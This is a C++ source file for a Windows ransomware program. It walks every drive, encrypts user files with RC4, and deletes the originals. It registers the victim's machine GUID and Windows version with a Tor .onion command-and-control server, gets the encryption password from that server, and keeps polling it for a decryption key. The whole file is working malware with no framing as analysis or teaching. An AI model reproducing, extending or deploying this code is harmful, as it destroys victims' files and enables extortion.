#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0400
#endif
#define KEY_WOW64_64KEY 0x0100
#define KEY_WOW64_32KEY 0x0200
#define RW_SIZE         512
#define BUFFER_SIZE     RW_SIZE * 2

#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#include "crypto.h"
#include <string.h>
#include <iostream>
#include <dirent.h>
#include <shlwapi.h>
#include <sstream>
#include <fstream>
#include <curl/curl.h>
#include <cstdio>
#include <wchar.h>
#include <cwchar>
#include <wininet.h>

//author: Tomáš Keske

using namespace std;

BOOL myEOF(HANDLE hFile, DWORD dwFileSize)
{
    DWORD dwCurPos = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
    if (dwCurPos >= dwFileSize) {
        return TRUE;
    } else {
        return FALSE;

    }
}

int getSubstrPosition(char * source,char *needle){

    char * found = strstr( source, needle);

    if (found != NULL) {
      int index = found - source;
      return index;
    }
}

void encrypt(const char *path, const char *password){

    char pathEnc[MAX_PATH];

    strcpy(pathEnc,path);
    strcat(pathEnc, ".encrypted");

    HANDLE hFile1 = CreateFile((LPSTR)path, GENERIC_ALL, 0,
                               NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {

        _tprintf(TEXT("CreateFile failed (%x)\n"),
                  GetLastError());
    }

    HANDLE hFile2 = CreateFile((LPTSTR)pathEnc, GENERIC_ALL, 0,
                               NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile2 == INVALID_HANDLE_VALUE) {
        CloseHandle(hFile1);

        _tprintf(TEXT("CreateFile2 failed (%x)\n"),GetLastError());
    }

    LPBYTE pBuffer = (LPBYTE)malloc(BUFFER_SIZE);

    if (pBuffer == NULL) {
        CloseHandle(hFile1);
        CloseHandle(hFile2);
        _tprintf(TEXT("malloc failed (%x)\n"), GetLastError());

    }

    DWORD dwBytesW = 0, dwBytes = 0;
    DWORD dwFileSize = GetFileSize(hFile1, NULL);

    CMyCrypto myCrypto((LPSTR)password, CALG_RC4);

    while (ReadFile(hFile1, pBuffer, RW_SIZE, &dwBytes, NULL)
           && dwBytes > 0) {

        if (myCrypto.Encrypt(pBuffer, &dwBytes, BUFFER_SIZE,
                             myEOF(hFile1, dwFileSize))) {

         WriteFile(hFile2, pBuffer, dwBytes, &dwBytesW,
                      NULL);
        }
    }

    free(pBuffer);
    CloseHandle(hFile1);
    CloseHandle(hFile2);

    DeleteFile(path);
}

void decrypt(const char *path, const char *password){

    char pathDec[MAX_PATH];

    printf("in decrypt\n\n");
    printf("path %s\n\n",path);

    int sbt = getSubstrPosition((char *) path, ".encrypted");

    strncpy(pathDec, path, sbt);
    pathDec[sbt] = '\0';

    printf("pathDec %s\n\n",pathDec);


    HANDLE hFile1 = CreateFile((LPSTR)path, GENERIC_ALL, 0,
                               NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile1 == INVALID_HANDLE_VALUE) {

        _tprintf(TEXT("CreateFile failed (%x)\n"),
                  GetLastError());
    }

    HANDLE hFile2 = CreateFile((LPTSTR)pathDec, GENERIC_ALL, 0,
                               NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile2 == INVALID_HANDLE_VALUE) {
        CloseHandle(hFile1);

        _tprintf(TEXT("CreateFile2 failed (%x)\n"),GetLastError());
    }

    LPBYTE pBuffer = (LPBYTE)malloc(BUFFER_SIZE);

    if (pBuffer == NULL) {
        CloseHandle(hFile1);
        CloseHandle(hFile2);
        _tprintf(TEXT("malloc failed (%x)\n"), GetLastError());
    }

    DWORD dwBytesW = 0, dwBytes = 0;
    DWORD dwFileSize = GetFileSize(hFile1, NULL);

    CMyCrypto myCrypto((LPSTR)password, CALG_RC4);

    while (ReadFile(hFile1, pBuffer, RW_SIZE, &dwBytes, NULL)
           && dwBytes > 0) {
        if (myCrypto.Decrypt(pBuffer, &dwBytes,
                             myEOF(hFile1, dwFileSize))) {
            WriteFile(hFile2, pBuffer, dwBytes, &dwBytesW,
                      NULL);
        }
    }

    free(pBuffer);
    CloseHandle(hFile1);
    CloseHandle(hFile2);

    DeleteFile(path);
}

int GetDriveNames (string arr[])
{
    char buffer[256] = { 0 };

    ::GetLogicalDriveStringsA(255, buffer);
    char *cp = buffer;

    string retval;

    int cnt = 0;

        while (*cp)
        {
            retval += cp;

            cp += strlen (cp)+1;

            arr[cnt] = retval;

            ++cnt;
            retval = "";
        }

    return cnt;
}

char * cntPath(char buff[], const char *drive, const char *path){

    strcpy(buff, drive);
    strcat(buff, path);

    if (strstr(buff, ".") == NULL){
        strcat(buff, "\\");
    }

    return buff;
}

void logFile(const char *file, const char *path){
    std::ofstream outfile;

    outfile.open(file, std::ios_base::app);

    outfile << path << "\n";
}

bool find_in_file(const char * file, const std::string & needle)
{
	std::ifstream in(file);
	std::string line;

	while (std::getline(in, line)){
		if (line.length() >= needle.length() && std::equal(needle.begin(), needle.end(), line.begin())){
			return true;
		}
	}

	return false;
}

bool skipFolder(const char * path){

    string excluded[] = {"Windows", "WINDOWS", "Program Files",
                         "Program Files (x86)", "Windows10Upgrade",
                         "$GetCurrent", "$SysReset", "PerfLogs"};

    string a = std::string(path);

    for (const string &ex : excluded){
        if (a.find(ex, 0) != string::npos){
           return TRUE;
        }
    }

    return FALSE;
}

bool skipExtension(const char * path){

    string excluded[] = {".exe", ".EXE", ".DLL", ".dll",
                         ".encrypted", "logFile.txt" };

    string a = std::string(path);

    for (const string &ex : excluded){
        if (a.find(ex, 0) != string::npos){
           return TRUE;
        }
    }

    return FALSE;
}

bool isEncrypted(const char * path){

    string enc[] = {".encrypted"};

    string a = std::string(path);

    for (const string &ex : enc){
        if (a.find(ex, 0) != string::npos){
           return TRUE;
        }
    }

    return FALSE;
}

typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64()
{
    BOOL bIsWow64 = FALSE;

    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(
        GetModuleHandle(TEXT("kernel32")),"IsWow64Process");

    if(NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(GetCurrentProcess(),&bIsWow64))
        {
            //error
        }
    }
    return bIsWow64;
}

int GetKeyData(HKEY hRootKey, char *subKey, char *value, LPBYTE data, DWORD cbData)
{
    HKEY hKey;

    if (IsWow64()){
        if(RegOpenKeyEx(hRootKey, subKey, 0, KEY_QUERY_VALUE|KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS)
        return 0;
    } else {
        if(RegOpenKeyEx(hRootKey, subKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
        return 0;
    }

    if(RegQueryValueEx(hKey, value, NULL, NULL, data, &cbData) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 0;
    }

    RegCloseKey(hKey);
    return 1;
}

int SetKeyData(HKEY hRootKey, char *subKey, DWORD dwType, char *value, LPBYTE data, DWORD cbData)
{
    HKEY hKey;
    if(RegCreateKey(hRootKey, subKey, &hKey) != ERROR_SUCCESS)
        return 0;

    if(RegSetValueEx(hKey, value, 0, dwType, data, cbData) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        return 0;
    }

    RegCloseKey(hKey);
    return 1;
}

void fsTraverseEnc(const char * path, const char *password){

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir (path)) != NULL) {

          while ((ent = readdir (dir)) != NULL) {

            char buff[MAX_PATH];
            cntPath(buff, path, ent->d_name);

            if (PathIsDirectory(buff)){

                if (strstr(buff, ".") != NULL || strstr(buff, "..") != NULL) {
                    continue;
                }else {

                    if(skipFolder(buff)){
                        continue;
                    }

                    if(!find_in_file("logFile.txt", buff)){
                        fsTraverseEnc(buff,password);
                        logFile("logFile.txt",buff);
                    }else {
                        continue;
                    }
                }

            } else {
                if (!skipExtension(buff)){
                    encrypt(buff, password);
                }
            }
        }
        
        closedir (dir);

    } else {
      /* could not open directory */
    }
}

void fsTraverseDec(const char * path, const char *password){

    DIR *dir;
    struct dirent *ent;

    if ((dir = opendir (path)) != NULL) {

          while ((ent = readdir (dir)) != NULL) {

            char buff[MAX_PATH];
            cntPath(buff, path, ent->d_name);

            if (PathIsDirectory(buff)){

                if (strstr(buff, ".") != NULL || strstr(buff, "..") != NULL) {
                    continue;
                }else {

                    if(skipFolder(buff)){
                        continue;
                    }

                    if(!find_in_file("decFile.txt", buff)){
                        fsTraverseDec(buff,password);
                        logFile("decFile.txt", buff);
                    }else {
                        continue;
                    }
                }

            } else {

                if (isEncrypted(buff)){
                    decrypt(buff, password);
                }
            }
        }
        
        closedir (dir);

    } else {
      /* could not open directory */
    }
}

void diskEnum(const char *password, int dec = 0){

    string arr[MAX_PATH];
    int c = GetDriveNames(arr);

    for (int i = 0; i<c; i++){
        if (!dec){
            fsTraverseEnc(arr[i].c_str(), password);
        } else {
            fsTraverseDec(arr[i].c_str(), password);
        }
    }
}

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

string registerWithCC(string version, string guid){

  CURL *curl;
  CURLcode res;
  std::string readBuffer;

  std::stringstream stream;
  stream << "version=" << version << "&guid=" << guid;
  string postString = stream.str();

  curl = curl_easy_init();
  if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://dp7pci3b4bsetxdz.onion/index.php");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postString.c_str());
        curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
        curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        return readBuffer;
   }
}

bool file_exists (const std::string& name) {
    ifstream f(name.c_str());
    return f.good();
}

string getProductName(){
    DWORD cbData[MAX_PATH];
    DWORD cbVal[MAX_PATH];

    GetKeyData(HKEY_LOCAL_MACHINE,
               "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
               "ProductName",(LPBYTE)cbVal,(DWORD)cbData);

    return string((char *) cbVal);
}

string getMachineGuid(){
	DWORD vvData[MAX_PATH];
	DWORD vvVal[MAX_PATH];

	int a =  GetKeyData(HKEY_LOCAL_MACHINE,
	                "Software\\Microsoft\\Cryptography",
	                "MachineGuid",(LPBYTE)vvVal,(DWORD)vvData);

	return string((char *) vvVal);
}

string getStamp(){
	DWORD vvData[MAX_PATH];
	DWORD vvVal[MAX_PATH];

	GetKeyData(HKEY_CURRENT_USER,"Software\\","ApplicationName",(LPBYTE)vvVal,
	(DWORD)vvData);

	return string((char *) vvVal);
}

string getPassword(){
    DWORD vvData[MAX_PATH];
    DWORD vvVal[MAX_PATH];

	int a = GetKeyData(HKEY_CURRENT_USER,"Software\\","Password",(LPBYTE)vvVal,
	(DWORD)vvData);

	if (a == 0){
		auto s = std::to_string(a);
		return s;
	} else {
		return string((char *) vvVal);
	}
}

string requestDecryptKey(){

	CURL *curl;
	CURLcode res;

	std::string readBuffer;
	std::string s0 = "http://dp7pci3b4bsetxdz.onion/clients/";
	std::stringstream stream;
	std::string machineguid = getMachineGuid();
	stream << s0 << machineguid << "/password.txt";
	string str = stream.str();

	cout << str << endl << endl;

	curl = curl_easy_init();

	if(curl) {
	    curl_easy_setopt(curl, CURLOPT_URL, str.c_str());
	    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
	    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
	    curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
	    curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
	    res = curl_easy_perform(curl);
	    curl_easy_cleanup(curl);

	    cout << readBuffer << endl;
	    return readBuffer;
	}
}

int main (int argc, char **argv)
{

   if(InternetCheckConnection("http://www.google.com",1,0)){

        if (!(strcmp(getStamp().c_str(), "workdone") == 0)){

            string pname = getProductName();
            string mguid = getMachineGuid();
            const char * password = getPassword().c_str();

            if (strcmp(password, "0") == 0){

                string pass = registerWithCC(pname.c_str(), mguid.c_str());

                SetKeyData(HKEY_CURRENT_USER, "Software\\", REG_SZ, "Password",
                           (LPBYTE)pass.c_str(), strlen(pass.c_str()));

                diskEnum(pass.c_str());
            } else {
                diskEnum(password);
            }

            HKEY hkey1 = NULL;

            RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\",
                0, KEY_ALL_ACCESS, &hkey1);

            RegDeleteValue(hkey1, "Password");

            RegCloseKey(hkey1);

            SetKeyData(HKEY_CURRENT_USER, "Software\\", REG_SZ, "ApplicationName",
                        (LPBYTE)"workdone", strlen("workdone"));

        }

        string decryptKey;

        while (true){

            string decKey;
            decKey = requestDecryptKey();

            cout << decKey << endl;
            cout << decKey.length() << endl;
            if (decKey.length() == 32){

                decryptKey = decKey;
                break;
            }
        }

        diskEnum(decryptKey.c_str(), 1);
    }

    return 0;
}